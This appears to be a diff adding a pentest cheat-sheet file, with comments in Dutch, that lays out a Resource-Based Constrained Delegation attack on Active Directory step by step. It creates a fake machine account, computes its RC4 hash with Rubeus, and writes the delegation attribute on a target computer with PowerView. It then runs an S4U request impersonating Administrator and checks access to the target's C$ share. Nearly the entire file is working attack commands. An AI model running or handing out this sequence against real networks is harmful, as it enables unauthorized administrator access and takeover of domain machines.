@@ -1,0 +1,14 @@
+# Resource-Based Constrained Delegation (RBCD) aanval
+# Vereiste: GenericWrite/GenericAll op target computer object
+# Stap 1: Maak fake machine account aan
+powershell -c "Import-Module .\Powermad.ps1; New-MachineAccount -MachineAccount YOURPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose"
+# Stap 2: Bereken RC4 hash van machine account
+.\Rubeus.exe hash /password:Password123! /user:YOURPC$ /domain:domain.local
+# Stap 3: Configureer RBCD - stel msDS-AllowedToActOnBehalfOfOtherIdentity in
+powershell -c "Import-Module .\PowerView.ps1; Set-DomainObject -Identity 'TARGET$' -Set @{'msds-allowedtoactonbehalfofotheridentity'=(New-Object Security.AccessControl.RawSecurityDescriptor('O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-DOMAIN-SID-YOURPC_RID)')).GetBinaryForm(0,(New-Object byte[] 1024),0)} -Verbose"
+# Of met PowerView Set-ADComputer:
+Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount YOURPC$
+# Stap 4: S4U aanval met fake machine account
+.\Rubeus.exe s4u /user:YOURPC$ /rc4:HASH_HERE /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
+# Stap 5: Verifieer
+ls \\target.domain.local\c$
